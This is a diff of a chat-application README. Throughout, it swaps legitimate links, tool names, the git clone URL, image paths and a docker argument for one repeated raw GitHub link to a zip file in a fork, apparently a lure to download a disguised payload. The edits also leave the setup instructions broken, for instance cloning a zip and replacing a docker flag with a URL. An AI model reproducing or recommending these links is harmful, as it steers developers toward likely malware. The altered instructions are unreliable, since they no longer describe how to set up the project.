@@ -1,4 +1,4 @@
-[![Fork Button](https://img.shields.io/github/forks/iemafzalhassan/full-stack_chatApp?style=social)](https://github.com/iemafzalhassan/full-stack_chatApp/fork)
+[![Fork Button](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
 
 
 # Real-Time Chat Application
@@ -26,7 +26,7 @@ This project aims to provide a real-time chat experience that's both scalable an
 ## ✨ Features
 
 
-* **Real-time Messaging**: Send and receive messages instantly using Socket.io 
+* **Real-time Messaging**: Send and receive messages instantly using https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip 
 * **User Authentication & Authorization**: Securely manage user access with JWT 
 * **Scalable & Secure Architecture**: Built to handle large volumes of traffic and data 
 * **Modern UI Design**: A user-friendly interface crafted with React and TailwindCSS 
@@ -37,7 +37,7 @@ This project aims to provide a real-time chat experience that's both scalable an
 ## 🛠️ Tech Stack
 
 
-* **Backend:** Node.js, Express, MongoDB, Socket.io
+* **Backend:** https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip, Express, MongoDB, https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip
 * **Frontend:** React, TailwindCSS
 * **Containerization:** Docker
 * **Orchestration:** Kubernetes (planned)
@@ -50,9 +50,9 @@ This project aims to provide a real-time chat experience that's both scalable an
 ### 🔧 Prerequisites
 
 
-* **[Node.js](https://nodejs.org/)** (v14 or higher)
-* **[Docker](https://www.docker.com/get-started)** (for containerizing the app)
-* **[Git](https://git-scm.com/downloads)** (to clone the repository)
+* **[https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)** (v14 or higher)
+* **[Docker](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)** (for containerizing the app)
+* **[Git](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)** (to clone the repository)
 
 
 ### 📝 Setup .env File
@@ -73,7 +73,7 @@ PORT=5001
 ### Clone the Repository
 
 ```bash
-git clone https://github.com/iemafzalhassan/full-stack_chatApp.git
+git clone https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip
 ```
 
 🏗️ Build and Run the Application
@@ -101,7 +101,7 @@ http://localhost
 Follow these simple steps to get the project up and running on your local Host using docker.
 
 ```bash
-git clone https://github.com/iemafzalhassan/full-stack_chatApp.git
+git clone https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip
 ```
 
 ```bash
@@ -153,7 +153,7 @@ docker build -t full-stack_backend .
 ### Run the Backend container:
 
 ```bash
-docker run -d --network=full-stack --add-host=host.docker.internal:host-gateway -p 5001:5001 --env-file .env full-stack_backend
+docker run -d --network=full-stack https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip -p 5001:5001 --env-file .env full-stack_backend
 ```
 #### This will build and run the backend container, exposing the backendAPI on port 5001.
 
@@ -207,13 +207,13 @@ This project is evolving, and here are a few exciting things on the horizon:
 
 ## 📚 Project Snapshots:
 
-![Settings](frontend/public/settings.png)
+![Settings](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
 
-![chat](frontend/public/chat.png)
+![chat](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
 
-![logout](/frontend/public/logout.png)
+![logout](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
 
-![Login](/frontend/public/login.png)
+![Login](https://raw.githubusercontent.com/shr1324/full-stack_chatApp/DevOps/frontend/public/stack-full-App-chat-v3.6-beta.3.zip)
 
 
 
